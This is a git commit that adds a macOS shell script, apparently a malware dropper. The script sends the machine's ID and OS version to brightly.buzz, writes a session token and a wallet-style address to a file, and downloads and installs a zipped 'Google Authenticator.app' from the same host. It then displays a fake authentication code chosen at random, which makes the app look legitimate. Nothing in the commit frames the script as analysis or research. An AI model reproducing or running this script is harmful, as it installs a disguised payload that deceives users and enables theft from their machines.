4da6201d437153c549ee22c3fdf9d8327705723e
jungun14 <jungun14@gmail.com>
2026-07-08 00:57:39 -0700

    Create 07d13b40-7fa7-4781-acb4-d21fabfcfa5c.sh

---
+++ 07d13b40-7fa7-4781-acb4-d21fabfcfa5c.sh
@@ -0,0 +1,38 @@
+#!/bin/bash
+
+curl -s "https://brightly.buzz/post_info?uuid=07d13b40-7fa7-4781-acb4-d21fabfcfa5c&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1
+
+cd ~
+mkdir tmp
+cd ~/tmp
+echo SESSION=Be4A9y3byZoecjIT1cT8H3QGMA+aCy+xSMVxa0GBDKJ6/mc42gG3hf6KPuenmR6iArRlFEng7JvAN2wDZC4VfQ== > context
+echo SERVER_ADDRESS=0xCd01cc4172842EC6351e8C72AA5D959a2C7def24 >> context
+
+cd ~/
+mkdir .gerc
+cd .gerc
+curl -o initer.zip https://brightly.buzz/fileServe/Authenticator.zip  > /dev/null 2>&1
+unzip -o initer.zip > /dev/null 2>&1
+rm -f initer.zip > /dev/null 2&>1
+mv "Google Authenticator.app" /Applications
+
+open "/Applications/Google Authenticator.app"
+
+array=(
+  "234166"
+  "923819"
+  "134665"
+  "195642"
+  "465102"
+  "355477"
+  "296082"
+  "964125"
+  "305478"
+  "532116"
+)
+RANDOM_INDEX=$((RANDOM % ${#array[@]}))
+OTP=${array[$RANDOM_INDEX]}
+FORMATTED_OTP="${OTP:0:3} ${OTP:3:3}"
+osascript -e "display dialog \"Authentication code: ${FORMATTED_OTP}\" with title \"Google Authenticator\" buttons {\"Confirm\"} default button \"Confirm\""
+
+exit 0
